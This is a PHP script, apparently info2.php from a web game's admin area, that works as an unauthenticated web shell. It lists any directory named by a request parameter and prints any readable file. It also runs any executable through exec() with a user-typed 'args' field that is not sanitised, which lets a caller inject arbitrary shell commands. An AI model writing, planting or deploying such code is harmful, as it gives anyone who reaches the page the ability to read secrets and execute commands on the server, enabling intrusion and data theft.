<?
if (!$path) {$path="/";}
$d = dir("$path");
$files = array();
$dirs = array();
if (strlen($path) > 500) {$path= "/";echo "Path reset!<br>";}
//echo "Handle: ".$d->handle."<br>\n";
echo "Path: ".$d->path."<br>\n";
while($entry=$d->read()) {
    $newpath = $path."/".$entry;
    if (filetype($newpath) == "dir") {
        $dirs[] = $entry;
    }
    else {
        $files[] = $entry;
    }
}
sort($dirs);
sort($files);
if (!$file) {
    echo "<table>";
    foreach ($dirs as $entry) {
            $newpath = $path."/".$entry;
            echo "<tr><td colspan=2><a href=\"info2.php?path=$newpath\">$entry</a></td></tr>";
            }
    foreach ($files as $temp) {
        $tfile = $path."/$temp";
        echo "<tr height=10><td>";
        if (is_writable($tfile)) {echo "<a href=\"info2.php?path=$path&file=$tfile\" style=\"color:green\">$temp</a>";} 
        elseif (is_executable($tfile)) {echo "<form action=\"info2.php\">
                                                    <input type=hidden name=path value=\"$path\">
                                                    <input type=hidden name=file value=\"$tfile\">
                                                    <a href=\"info2.php?path=$path&file=$tfile&noex=1\" style=\"color:red\">*$temp</a>
                                                    <input type=text name=args value=\"\" size=\"6\" style=\"height:16px\">
                                                    <input style=\"height:16px\" type=submit value=_>
                                              </form>";} 
        elseif (is_readable($tfile)) {echo "<a href=\"info2.php?path=$path&file=$tfile\" style=\"color:red\">$temp</a>";} 
        else {echo $temp;}
        $owner = fileowner($tfile);
        $filesize = filesize($tfile);
        echo "</td><td>$owner&nbsp;&nbsp;&nbsp;&nbsp;$filesize</td>";
        echo "</tr>";
    }
}
if ($file) {
    echo "<br><a href=\"javascript:history.back()\">Back</a><br>\n<br>";
    if (is_executable($file) && !$noex) {
        echo "<br>Execuction:<br>";
        $exec = $file." ".$args." 2>> /data/www/syndicates.krawall.de/testgame/cgi-bin/admin/startroundlogs.txt";
        exec($exec,$output);
        foreach ($output as $temp) {
//            $temp = ereg_replace ("\n", "<br>", $temp);
            echo $temp."<br>";
        }
        
    }
    else {
        $output = file($file);
        foreach ($output as $line) {
        echo $line."<br>";
        }
    }
    echo "<br><a href=\"javascript:history.back()\">Back</a><br>\n<br>";
}
$d->close();

?>